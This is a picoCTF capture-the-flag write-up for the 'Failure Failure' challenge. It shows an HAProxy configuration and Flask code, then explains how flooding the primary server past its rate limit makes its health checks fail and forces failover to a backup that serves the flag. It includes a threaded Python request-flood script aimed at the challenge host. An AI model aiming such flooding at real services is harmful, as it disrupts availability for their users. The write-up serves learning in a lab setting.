# picoCTF – Failure Failure
 
> Welcome to Failure Failure — a high-available system.
> This challenge simulates a real-world failover scenario where one server is prioritized over the other.
> A load balancer stands between you and the truth — and it won't hand over the flag until you force its hand.
>
> You can begin your journey here to try and retrieve the flag.
> For reference:
> - The HAProxy configuration used in this challenge is available here.
> - The application code is available here.

---

## Background
 
<img width="321" height="157" alt="image" src="https://github.com/user-attachments/assets/758397d5-1b70-4518-ba34-035200ed15d7" />
 
A **load balancer** is a service that distributes traffic across multiple servers to improve availability. Instead of one server handling every request, the load balancer decides which server gets each request.
 
In this specific challenge, the service used is called HAProxy - an open source load balancer.

---
The challenge provides a `haproxy.cfg` file
```
backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
```

The challenge also provides the Flask application running on both servers:
 
```python
@app.route('/')
@limiter.limit("300 per minute")
def home():
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
    return render_template("index.html", flag=flag)
```
 
And the error handler:
 
```python
@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503
```

### Takeaways

* s1 - primary server, s2 - backup server
* HAProxy checks each server's health every 2 seconds
* s1 is marked DOWN after 2 consecutive failed health checks, s1 needs 3 consecutive successful checks to come back UP
* **s2 has `IS_BACKUP=yes`** in its environment, so it serves the real flag. s1 does not.
* **The rate limit is only 300 requests per minute.** Exceeding it returns a **503** response
* So basically flood the server with over 300+ requests per minute, emulating a DOS attack
* This flood has to last 4 seconds because health check every 2s * 2 = 4s

---

## Exploit
```
Flood s1 with 300+ requests
        ↓
s1 returns 503 (rate limit exceeded)
        ↓
HAProxy health check hits s1, gets 503 instead of 200
        ↓
After 2 consecutive failed checks, HAProxy marks s1 DOWN
        ↓
HAProxy promotes s2 (backup) to active
        ↓
Next request lands on s2 → flag is returned
```
---

## Code:
```
import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://mysterious-sea.picoctf.net:50198/"

def hit(_):
    try:
        requests.get(url, timeout=2)
    except:
        pass

with ThreadPoolExecutor(max_workers=50) as pool:
    pool.map(hit, range(350))
```
---
## Flag
 
```
picoCTF{<redacted>}
```
